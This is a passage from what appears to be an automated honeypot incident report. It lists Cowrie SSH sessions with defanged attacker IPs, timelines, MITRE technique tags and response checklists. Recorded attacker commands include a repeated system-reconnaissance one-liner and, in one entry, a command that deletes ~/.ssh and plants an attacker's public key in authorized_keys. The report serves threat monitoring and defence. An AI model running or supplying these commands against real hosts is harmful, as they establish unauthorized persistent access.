| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-06 13:17:56` | `cowrie.session.connect` |
| `2026-09-06 13:17:56` | `cowrie.client.version` |
| `2026-09-06 13:17:56` | `cowrie.client.kex` |
| `2026-09-06 13:17:57` | `cowrie.login.success` |
| `2026-09-06 13:17:58` | `cowrie.direct-tcpip.request` |
| `2026-09-06 13:17:59` | `cowrie.direct-tcpip.ja4` |
| `2026-09-06 13:17:59` | `cowrie.direct-tcpip.data` |
| `2026-09-06 13:17:59` | `cowrie.direct-tcpip.request` |
| `2026-09-06 13:17:59` | `cowrie.direct-tcpip.ja4` |
| `2026-09-06 13:17:59` | `cowrie.direct-tcpip.data` |
| `2026-09-06 13:17:59` | `cowrie.direct-tcpip.request` |
| `2026-09-06 13:17:59` | `cowrie.direct-tcpip.ja4` |
| `2026-09-06 13:17:59` | `cowrie.direct-tcpip.data` |
| `2026-09-06 13:18:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `77.90.185[.]17` to AbuseIPDB if not already reported
- [ ] Block `77.90.185[.]17` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2fdea88adb08

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]234` |
| **First Seen** | 2026-09-06 13:21 |
| **Last Seen** | 2026-09-06 13:21 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:${PATH:-} LC_ALL=C LANG=C; uname=$(for c in uname /bin/uname /usr/bin/uname 'busybox uname' 'toybox uname'; do v=$($c -s -v -n -m 2>/dev/null) && [ -n "$v" ] && { printf '%s\n' "$v"; exit; }; done; IFS= read -r v < /proc/version && printf '%s\n' "$v") 2>/dev/null; arch=$(for c in uname /bin/uname /usr/bin/uname 'busybox uname' 'toybox uname'; do v=$($c -m 2>/dev/null) && [ -n "$v" ] && { printf '%s\n' "$v"; exit; }; done; for c in arch` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-06 13:21:36` | `cowrie.session.connect` |
| `2026-09-06 13:21:36` | `cowrie.client.version` |
| `2026-09-06 13:21:36` | `cowrie.client.kex` |
| `2026-09-06 13:21:37` | `cowrie.login.success` |
| `2026-09-06 13:21:38` | `cowrie.session.params` |
| `2026-09-06 13:21:38` | `cowrie.command.input` |
| `2026-09-06 13:21:38` | `cowrie.log.closed` |
| `2026-09-06 13:21:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]234` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]234` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6fe6a843bb7c

| Field | Detail |
|---|---|
| **Source IP** | `176.53.159[.]196` |
| **First Seen** | 2026-09-06 13:24 |
| **Last Seen** | 2026-09-06 13:24 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-06 13:24:19` | `cowrie.session.connect` |
| `2026-09-06 13:24:19` | `cowrie.client.version` |
| `2026-09-06 13:24:19` | `cowrie.client.kex` |
| `2026-09-06 13:24:20` | `cowrie.login.success` |
| `2026-09-06 13:24:20` | `cowrie.direct-tcpip.request` |
| `2026-09-06 13:24:20` | `cowrie.direct-tcpip.data` |
| `2026-09-06 13:24:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.53.159[.]196` to AbuseIPDB if not already reported
- [ ] Block `176.53.159[.]196` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ba190cafe289

| Field | Detail |
|---|---|
| **Source IP** | `138.226.239[.]233` |
| **First Seen** | 2026-09-06 13:26 |
| **Last Seen** | 2026-09-06 13:27 |
| **Session Duration** | 16s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-06 13:26:54` | `cowrie.session.connect` |
| `2026-09-06 13:26:54` | `cowrie.client.version` |
| `2026-09-06 13:26:54` | `cowrie.client.kex` |
| `2026-09-06 13:26:55` | `cowrie.login.success` |
| `2026-09-06 13:26:57` | `cowrie.direct-tcpip.request` |
| `2026-09-06 13:26:59` | `cowrie.direct-tcpip.ja4` |
| `2026-09-06 13:26:59` | `cowrie.direct-tcpip.data` |
| `2026-09-06 13:27:01` | `cowrie.direct-tcpip.request` |
| `2026-09-06 13:27:02` | `cowrie.direct-tcpip.ja4` |
| `2026-09-06 13:27:02` | `cowrie.direct-tcpip.data` |
| `2026-09-06 13:27:04` | `cowrie.direct-tcpip.request` |
| `2026-09-06 13:27:07` | `cowrie.direct-tcpip.ja4` |
| `2026-09-06 13:27:07` | `cowrie.direct-tcpip.data` |
| `2026-09-06 13:27:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `138.226.239[.]233` to AbuseIPDB if not already reported
- [ ] Block `138.226.239[.]233` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-15086d9827a8

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]234` |
| **First Seen** | 2026-09-06 13:30 |
| **Last Seen** | 2026-09-06 13:30 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:${PATH:-} LC_ALL=C LANG=C; uname=$(for c in uname /bin/uname /usr/bin/uname 'busybox uname' 'toybox uname'; do v=$($c -s -v -n -m 2>/dev/null) && [ -n "$v" ] && { printf '%s\n' "$v"; exit; }; done; IFS= read -r v < /proc/version && printf '%s\n' "$v") 2>/dev/null; arch=$(for c in uname /bin/uname /usr/bin/uname 'busybox uname' 'toybox uname'; do v=$($c -m 2>/dev/null) && [ -n "$v" ] && { printf '%s\n' "$v"; exit; }; done; for c in arch` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-06 13:30:51` | `cowrie.session.connect` |
| `2026-09-06 13:30:51` | `cowrie.client.version` |
| `2026-09-06 13:30:51` | `cowrie.client.kex` |
| `2026-09-06 13:30:52` | `cowrie.login.success` |
| `2026-09-06 13:30:53` | `cowrie.session.params` |
| `2026-09-06 13:30:53` | `cowrie.command.input` |
| `2026-09-06 13:30:53` | `cowrie.log.closed` |
| `2026-09-06 13:30:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]234` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]234` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6c7a07a29fc8

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]234` |
| **First Seen** | 2026-09-06 13:36 |
| **Last Seen** | 2026-09-06 13:36 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:${PATH:-} LC_ALL=C LANG=C; uname=$(for c in uname /bin/uname /usr/bin/uname 'busybox uname' 'toybox uname'; do v=$($c -s -v -n -m 2>/dev/null) && [ -n "$v" ] && { printf '%s\n' "$v"; exit; }; done; IFS= read -r v < /proc/version && printf '%s\n' "$v") 2>/dev/null; arch=$(for c in uname /bin/uname /usr/bin/uname 'busybox uname' 'toybox uname'; do v=$($c -m 2>/dev/null) && [ -n "$v" ] && { printf '%s\n' "$v"; exit; }; done; for c in arch` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-06 13:36:00` | `cowrie.session.connect` |
| `2026-09-06 13:36:00` | `cowrie.client.version` |
| `2026-09-06 13:36:00` | `cowrie.client.kex` |
| `2026-09-06 13:36:01` | `cowrie.login.success` |
| `2026-09-06 13:36:02` | `cowrie.session.params` |
| `2026-09-06 13:36:02` | `cowrie.command.input` |
| `2026-09-06 13:36:02` | `cowrie.log.closed` |
| `2026-09-06 13:36:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]234` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]234` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-84fccf3f4f65

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]234` |
| **First Seen** | 2026-09-06 13:40 |
| **Last Seen** | 2026-09-06 13:40 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:${PATH:-} LC_ALL=C LANG=C; uname=$(for c in uname /bin/uname /usr/bin/uname 'busybox uname' 'toybox uname'; do v=$($c -s -v -n -m 2>/dev/null) && [ -n "$v" ] && { printf '%s\n' "$v"; exit; }; done; IFS= read -r v < /proc/version && printf '%s\n' "$v") 2>/dev/null; arch=$(for c in uname /bin/uname /usr/bin/uname 'busybox uname' 'toybox uname'; do v=$($c -m 2>/dev/null) && [ -n "$v" ] && { printf '%s\n' "$v"; exit; }; done; for c in arch` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-06 13:40:13` | `cowrie.session.connect` |
| `2026-09-06 13:40:13` | `cowrie.client.version` |
| `2026-09-06 13:40:13` | `cowrie.client.kex` |
| `2026-09-06 13:40:13` | `cowrie.login.success` |
| `2026-09-06 13:40:14` | `cowrie.session.params` |
| `2026-09-06 13:40:14` | `cowrie.command.input` |
| `2026-09-06 13:40:14` | `cowrie.log.closed` |
| `2026-09-06 13:40:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]234` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]234` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-acc80d1f5539

| Field | Detail |
|---|---|
| **Source IP** | `64.110.90[.]250` |
| **First Seen** | 2026-09-06 13:40 |
| **Last Seen** | 2026-09-06 13:40 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-06 13:40:29` | `cowrie.session.connect` |
| `2026-09-06 13:40:29` | `cowrie.client.version` |
| `2026-09-06 13:40:29` | `cowrie.client.kex` |
| `2026-09-06 13:40:30` | `cowrie.login.success` |
| `2026-09-06 13:40:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `64.110.90[.]250` to AbuseIPDB if not already reported
- [ ] Block `64.110.90[.]250` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f66c9583828d

| Field | Detail |
|---|---|
| **Source IP** | `64.110.90[.]250` |
| **First Seen** | 2026-09-06 13:40 |
| **Last Seen** | 2026-09-06 13:40 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-06 13:40:29` | `cowrie.session.connect` |
| `2026-09-06 13:40:29` | `cowrie.client.version` |
| `2026-09-06 13:40:29` | `cowrie.client.kex` |
| `2026-09-06 13:40:30` | `cowrie.login.success` |
| `2026-09-06 13:40:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `64.110.90[.]250` to AbuseIPDB if not already reported
- [ ] Block `64.110.90[.]250` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4d95d541f424

| Field | Detail |
|---|---|
| **Source IP** | `23.97.62[.]112` |
| **First Seen** | 2026-09-06 13:46 |
| **Last Seen** | 2026-09-06 13:47 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-06 13:46:59` | `cowrie.session.connect` |
| `2026-09-06 13:46:59` | `cowrie.client.version` |
| `2026-09-06 13:46:59` | `cowrie.client.kex` |
| `2026-09-06 13:47:00` | `cowrie.login.success` |
| `2026-09-06 13:47:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `23.97.62[.]112` to AbuseIPDB if not already reported
- [ ] Block `23.97.62[.]112` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e6c10352f41c

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]234` |
| **First Seen** | 2026-09-06 13:48 |
| **Last Seen** | 2026-09-06 13:49 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:${PATH:-} LC_ALL=C LANG=C; uname=$(for c in uname /bin/uname /usr/bin/uname 'busybox uname' 'toybox uname'; do v=$($c -s -v -n -m 2>/dev/null) && [ -n "$v" ] && { printf '%s\n' "$v"; exit; }; done; IFS= read -r v < /proc/version && printf '%s\n' "$v") 2>/dev/null; arch=$(for c in uname /bin/uname /usr/bin/uname 'busybox uname' 'toybox uname'; do v=$($c -m 2>/dev/null) && [ -n "$v" ] && { printf '%s\n' "$v"; exit; }; done; for c in arch` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-06 13:48:57` | `cowrie.session.connect` |
| `2026-09-06 13:48:58` | `cowrie.client.version` |
| `2026-09-06 13:48:58` | `cowrie.client.kex` |
| `2026-09-06 13:48:58` | `cowrie.login.success` |
| `2026-09-06 13:48:59` | `cowrie.session.params` |
| `2026-09-06 13:48:59` | `cowrie.command.input` |
| `2026-09-06 13:49:00` | `cowrie.log.closed` |
| `2026-09-06 13:49:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]234` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]234` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5edaea6c2d11

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]234` |
| **First Seen** | 2026-09-06 13:51 |
| **Last Seen** | 2026-09-06 13:51 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:${PATH:-} LC_ALL=C LANG=C; uname=$(for c in uname /bin/uname /usr/bin/uname 'busybox uname' 'toybox uname'; do v=$($c -s -v -n -m 2>/dev/null) && [ -n "$v" ] && { printf '%s\n' "$v"; exit; }; done; IFS= read -r v < /proc/version && printf '%s\n' "$v") 2>/dev/null; arch=$(for c in uname /bin/uname /usr/bin/uname 'busybox uname' 'toybox uname'; do v=$($c -m 2>/dev/null) && [ -n "$v" ] && { printf '%s\n' "$v"; exit; }; done; for c in arch` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-06 13:51:31` | `cowrie.session.connect` |
| `2026-09-06 13:51:31` | `cowrie.client.version` |
| `2026-09-06 13:51:31` | `cowrie.client.kex` |
| `2026-09-06 13:51:32` | `cowrie.login.success` |
| `2026-09-06 13:51:33` | `cowrie.session.params` |
| `2026-09-06 13:51:33` | `cowrie.command.input` |
| `2026-09-06 13:51:33` | `cowrie.log.closed` |
| `2026-09-06 13:51:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]234` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]234` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6d409c75051f

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]234` |
| **First Seen** | 2026-09-06 13:54 |
| **Last Seen** | 2026-09-06 13:54 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:${PATH:-} LC_ALL=C LANG=C; uname=$(for c in uname /bin/uname /usr/bin/uname 'busybox uname' 'toybox uname'; do v=$($c -s -v -n -m 2>/dev/null) && [ -n "$v" ] && { printf '%s\n' "$v"; exit; }; done; IFS= read -r v < /proc/version && printf '%s\n' "$v") 2>/dev/null; arch=$(for c in uname /bin/uname /usr/bin/uname 'busybox uname' 'toybox uname'; do v=$($c -m 2>/dev/null) && [ -n "$v" ] && { printf '%s\n' "$v"; exit; }; done; for c in arch` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-06 13:54:34` | `cowrie.session.connect` |
| `2026-09-06 13:54:34` | `cowrie.client.version` |
| `2026-09-06 13:54:34` | `cowrie.client.kex` |
| `2026-09-06 13:54:35` | `cowrie.login.success` |
| `2026-09-06 13:54:36` | `cowrie.session.params` |
| `2026-09-06 13:54:36` | `cowrie.command.input` |
| `2026-09-06 13:54:36` | `cowrie.log.closed` |
| `2026-09-06 13:54:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]234` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]234` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-dd2da6cd18a1

| Field | Detail |
|---|---|
| **Source IP** | `149.202.50[.]58` |
| **First Seen** | 2026-09-06 13:58 |
| **Last Seen** | 2026-09-06 13:58 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-06 13:58:31` | `cowrie.session.connect` |
| `2026-09-06 13:58:31` | `cowrie.client.version` |
| `2026-09-06 13:58:31` | `cowrie.client.kex` |
| `2026-09-06 13:58:32` | `cowrie.login.success` |
| `2026-09-06 13:58:33` | `cowrie.session.params` |
| `2026-09-06 13:58:33` | `cowrie.command.input` |
| `2026-09-06 13:58:33` | `cowrie.command.failed` |
| `2026-09-06 13:58:33` | `cowrie.log.closed` |
| `2026-09-06 13:58:33` | `cowrie.session.params` |
| `2026-09-06 13:58:33` | `cowrie.command.input` |
| `2026-09-06 13:58:33` | `cowrie.session.file_download` |
| `2026-09-06 13:58:33` | `cowrie.log.closed` |
| `2026-09-06 13:58:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `149.202.50[.]58` to AbuseIPDB if not already reported
- [ ] Block `149.202.50[.]58` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-631e89c7ef90

| Field | Detail |
|---|---|
| **Source IP** | `149.202.50[.]58` |
| **First Seen** | 2026-09-06 13:58 |
| **Last Seen** | 2026-09-06 13:58 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-06 13:58:34` | `cowrie.session.connect` |
| `2026-09-06 13:58:34` | `cowrie.client.version` |
| `2026-09-06 13:58:34` | `cowrie.client.kex` |
| `2026-09-06 13:58:34` | `cowrie.login.success` |
| `2026-09-06 13:58:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `149.202.50[.]58` to AbuseIPDB if not already reported
- [ ] Block `149.202.50[.]58` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cb14b9a202bd

| Field | Detail |
|---|---|
| **Source IP** | `149.202.50[.]58` |
| **First Seen** | 2026-09-06 13:58 |
| **Last Seen** | 2026-09-06 13:58 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-06 13:58:34` | `cowrie.session.connect` |
| `2026-09-06 13:58:34` | `cowrie.client.version` |
| `2026-09-06 13:58:34` | `cowrie.client.kex` |
| `2026-09-06 13:58:35` | `cowrie.login.success` |
| `2026-09-06 13:58:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `149.202.50[.]58` to AbuseIPDB if not already reported
- [ ] Block `149.202.50[.]58` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bb6944048768

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]234` |
| **First Seen** | 2026-09-06 14:01 |
| **Last Seen** | 2026-09-06 14:01 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:${PATH:-} LC_ALL=C LANG=C; uname=$(for c in uname /bin/uname /usr/bin/uname 'busybox uname' 'toybox uname'; do v=$($c -s -v -n -m 2>/dev/null) && [ -n "$v" ] && { printf '%s\n' "$v"; exit; }; done; IFS= read -r v < /proc/version && printf '%s\n' "$v") 2>/dev/null; arch=$(for c in uname /bin/uname /usr/bin/uname 'busybox uname' 'toybox uname'; do v=$($c -m 2>/dev/null) && [ -n "$v" ] && { printf '%s\n' "$v"; exit; }; done; for c in arch` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-06 14:01:13` | `cowrie.session.connect` |
| `2026-09-06 14:01:13` | `cowrie.client.version` |
| `2026-09-06 14:01:13` | `cowrie.client.kex` |
| `2026-09-06 14:01:13` | `cowrie.login.success` |
| `2026-09-06 14:01:14` | `cowrie.session.params` |
| `2026-09-06 14:01:14` | `cowrie.command.input` |
| `2026-09-06 14:01:14` | `cowrie.log.closed` |
| `2026-09-06 14:01:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]234` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]234` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-21d1fbfe57d3

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]234` |
| **First Seen** | 2026-09-06 14:06 |
| **Last Seen** | 2026-09-06 14:07 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:${PATH:-} LC_ALL=C LANG=C; uname=$(for c in uname /bin/uname /usr/bin/uname 'busybox uname' 'toybox uname'; do v=$($c -s -v -n -m 2>/dev/null) && [ -n "$v" ] && { printf '%s\n' "$v"; exit; }; done; IFS= read -r v < /proc/version && printf '%s\n' "$v") 2>/dev/null; arch=$(for c in uname /bin/uname /usr/bin/uname 'busybox uname' 'toybox uname'; do v=$($c -m 2>/dev/null) && [ -n "$v" ] && { printf '%s\n' "$v"; exit; }; done; for c in arch` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-06 14:06:58` | `cowrie.session.connect` |
| `2026-09-06 14:06:58` | `cowrie.client.version` |
| `2026-09-06 14:06:58` | `cowrie.client.kex` |
| `2026-09-06 14:06:59` | `cowrie.login.success` |
| `2026-09-06 14:07:01` | `cowrie.session.params` |
| `2026-09-06 14:07:01` | `cowrie.command.input` |
| `2026-09-06 14:07:01` | `cowrie.log.closed` |
| `2026-09-06 14:07:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]234` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]234` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5748b78cf826

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]234` |
| **First Seen** | 2026-09-06 14:09 |
| **Last Seen** | 2026-09-06 14:09 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:${PATH:-} LC_ALL=C LANG=C; uname=$(for c in uname /bin/uname /usr/bin/uname 'busybox uname' 'toybox uname'; do v=$($c -s -v -n -m 2>/dev/null) && [ -n "$v" ] && { printf '%s\n' "$v"; exit; }; done; IFS= read -r v < /proc/version && printf '%s\n' "$v") 2>/dev/null; arch=$(for c in uname /bin/uname /usr/bin/uname 'busybox uname' 'toybox uname'; do v=$($c -m 2>/dev/null) && [ -n "$v" ] && { printf '%s\n' "$v"; exit; }; done; for c in arch` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-06 14:09:33` | `cowrie.session.connect` |
| `2026-09-06 14:09:33` | `cowrie.client.version` |
| `2026-09-06 14:09:33` | `cowrie.client.kex` |
| `2026-09-06 14:09:33` | `cowrie.login.success` |
| `2026-09-06 14:09:34` | `cowrie.session.params` |
| `2026-09-06 14:09:34` | `cowrie.command.input` |
| `2026-09-06 14:09:34` | `cowrie.log.closed` |
| `2026-09-06 14:09:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]234` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]234` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-82374bf6adee

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]234` |
| **First Seen** | 2026-09-06 14:13 |
| **Last Seen** | 2026-09-06 14:13 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
